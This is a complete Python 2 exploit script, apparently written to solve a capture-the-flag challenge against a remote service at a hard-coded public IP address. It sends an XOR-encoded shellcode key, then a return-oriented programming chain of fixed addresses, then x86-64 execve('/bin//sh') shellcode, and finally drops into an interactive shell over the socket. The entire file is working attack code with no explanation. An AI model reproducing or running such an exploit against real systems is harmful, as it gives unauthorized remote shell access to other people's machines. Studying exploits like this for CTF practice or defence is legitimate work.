import socket
import telnetlib
import time
import struct

HOST, PORT = '192.168.56.1', 6500
HOST, PORT = '0.0.0.0', 7500
HOST, PORT = '104.154.90.175', 54509
p = lambda *x: ''.join(struct.pack("<Q", y) for y in x)

shcode = "\x54\x5E\x31\xC0\x31\xFF\x6A\x7F\x5A\x0F\x05\x5A\xC3"
rop = p(7, 0x400ea3, 0x400000, 0x400ea1, 0x1000, 0, 0x4008d0, 0x400ea1, 0x400000, 0, 0x400ae0, 0, 0x400000)
execve = "j;X\x99H\xbb/bin//shRST_RWT^\x0f\x05"
xored = 0x8b, 0xa2, 0x03, 0xf2, 0x16, 0x37, 0x1d, 0xe4, 0x29, 0xd7, 0xec, 0x67, 0xb1, 0x92, 0x92, 0x0d
xored = [ord(x)^ord(y)^z for x, y, z in zip(shcode.ljust(16, "\x00"), "\x00" * 16, xored)]
xored = bytearray(xored)
key = '\x00' * 17 + xored

s = socket.create_connection((HOST, PORT))
# raw_input('>> ')

print s.recv(1024)
s.send(key + '\n')
print s.recv(1024)
time.sleep(1)
print 'sent'
s.send(rop)
time.sleep(1)
print 'sent'
s.send(execve)
t = telnetlib.Telnet()
t.sock = s
t.interact()